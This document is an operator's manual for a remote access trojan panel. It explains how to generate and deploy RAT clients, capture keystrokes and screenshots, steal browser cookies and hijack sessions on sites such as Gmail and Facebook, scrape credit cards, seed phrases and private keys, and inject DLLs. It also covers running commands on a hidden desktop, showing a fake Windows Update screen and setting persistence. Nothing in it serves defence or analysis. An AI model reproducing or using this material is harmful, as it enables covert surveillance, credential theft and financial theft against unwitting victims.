# CLI C+ System - User Guide

## Dashboard Pages

### Dashboard
Shows a client list on the left. Click a client to select it. Two tabs below:
- Commands tab: dropdown of preset commands + custom text box + Send button. Output shows below.
- Processes tab: shows running processes on the selected client with Refresh button.

### Clients
Table view of all connected agents. Shows Client ID, Hostname, User, OS, Status (online/offline dot), Last Seen.

### Files
Select a client from the dropdown. A visual file browser appears. Navigate folders by clicking. Download files. Upload not yet implemented.

### Screenshots
Select a client (or All clients). Filter by date. Shows a gallery of captured screenshots with timestamps. Refresh, Delete, Export buttons. Pagination at bottom.

### Remote Access
Select a client. Set FPS and Quality. Click Start Stream to begin live screen viewing. Canvas supports mouse clicks and keyboard input. Stop Stream to end. Restart RAT button with confirmation.

### Keylogs
Select a client (or All clients). Start All / Stop All buttons. Shows keystrokes grouped by app/window. Search filter. Export to text file. Clear button. Auto-scroll toggle. Shows which clients are currently capturing.

### Cookies
Select a client (or All clients). Shows table of captured cookies: Host, Cookie Count, Browser, Client, Last Updated. Click Run to open a browser session with cookies injected. Grab Cookies button to manually trigger. Fire All button to auto-open sessions for detected platforms (Facebook, Gmail, Netflix, Steam, etc.). Search filter.

### Scanned Data
Select a client (or All clients). Shows auto-extracted data: credit cards, bank info, crypto addresses, seed phrases, private keys, wallet data. Filter by data type. Search filter. Click any entry to preview full details in a modal. Copy values. Delete individual entries. Clear All. Export to text file.

### RAT Download
Enter your server IP and port. Your User ID is auto-filled. Set beacon interval. Toggle features (Screenshot, Keylogger, File Browser). Click Generate RAT Client, then Download. Optional custom filename.

---

## Commands (Type in Command Panel)

Select a client on the Dashboard page first. Use the dropdown for common commands or type custom ones.

### Screenshots
screenshot - Take a single screenshot
screenshot_stream_start fps=5 quality=70 width=1280 height=720 - Start live stream
screenshot_stream_stop - Stop live stream
screenshot_stream_status - Check if stream is active

### Keylogging
keylog_start - Start capturing keystrokes
keylog_stop - Stop capturing keystrokes
keylog_get - Manually retrieve captured keys

### File Browser (via command, but Files page has visual browser)
list_dir C:\Users - List directory contents
list_drives - List all drives
cd C:\Windows - Change directory
pwd - Show current directory
mkdir C:\Temp\NewFolder - Create directory
rm C:\Temp\file.txt - Delete file/folder
rm_rf C:\Temp\Folder - Recursively delete
rename C:\old.txt|C:\new.txt - Rename
copy C:\src.txt|C:\dest.txt - Copy file
move C:\src.txt|C:\dest.txt - Move file
search C:\Users|*.docx|50 - Search files (root|pattern|max results)
properties C:\file.txt - Get file properties
preview C:\file.txt|100 - Preview text file
touch C:\newfile.txt - Create empty file
zip C:\Folder|C:\output.zip - Zip file/folder
unzip C:\archive.zip|C:\output - Unzip
mime C:\file.pdf - Get MIME type
dir_size C:\Windows - Get directory size
download C:\file.txt - Download file from client
upload C:\path\to\save\file.txt - Upload file to client

### Process Management
PROCESS_LIST - List all running processes
process_kill 1234 - Kill process by PID
process_suspend 1234 - Suspend a process
process_resume 1234 - Resume a process
module_list 1234 - List loaded DLLs in a process
process_priority 1234 128 - Set priority (64=idle, 32=normal, 128=high, 256=realtime)

### DLL Injection
INJECT_DLL|1234|C:\payload.dll|createremotethread - Inject DLL into process

### Cookies
COOKIE_GRAB - Manually grab all browser cookies

### Data Scraper
data_scraper - Start/reset the file scanner
data_scraper_stop - Stop the file scanner

### Fake Update Screen
show_update - Display fake Windows Update screen
hide_update - Hide the fake update screen

### Hidden Desktop
stealth_on - Switch to hidden desktop
stealth_off - Switch back to visible desktop
stealth_launch C:\app.exe - Launch app on hidden desktop
stealth_exec cmd /c whoami - Execute command on hidden desktop
stealth_status - Check current desktop mode

### Remote Command Execution
exec cmd /c whoami - Execute any system command
exec powershell Get-Process - Run PowerShell commands

### Persistence
persistence_on - Enable auto-start on boot
persistence_off - Disable auto-start on boot

### Agent Control
restart_rat - Restart the agent
exit - Disconnect the agent

---

## Troubleshooting

Agent won't connect - Check bridge is running on port 4444. Check firewall. Verify IP address.
Dashboard shows no clients - Check WebSocket connection (port 8080). Verify user ID matches.
Screenshot returns empty - Run agent as Administrator.
Cookie grab returns nothing - Run agent as Administrator. Close browser first.
Port already in use - Change ports in bridge configuration.
"Access denied" - You don't own that client. Contact admin.

---

## Default Login

Username: admin
Password: admin123
